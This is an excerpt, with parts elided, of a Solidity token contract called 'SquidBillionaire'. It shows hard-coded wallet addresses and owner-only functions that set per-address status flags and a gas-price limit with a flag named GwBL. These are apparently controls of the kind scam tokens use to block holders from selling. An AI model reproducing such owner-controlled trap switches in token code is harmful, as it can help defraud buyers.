...
contract SquidBillionaire is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SquidBillionaire";
    string private _symbol = "SquidBillionaire";
    uint8 private _decimals = 9;

    address payable private MarketingWallet = payable(0x862d47994490B90bAee8dbC4DA39a836d388C1D6); // Marketing Address BHC2
    address payable private TeamWallet = payable(0x5c57D04Db4359F4A951Ca1442D76E624eA2b081C); // Buy Back Address
    ...
    //manage address
    function UpdateTx(address[] calldata addresses, bool status) public onlyOwner {
    ...
    function GUpdate (uint256 _GW, bool _GWBL) public onlyOwner {
               GWEI = _GW * 1 gwei; 
               GwBL = _GWBL;
    }
}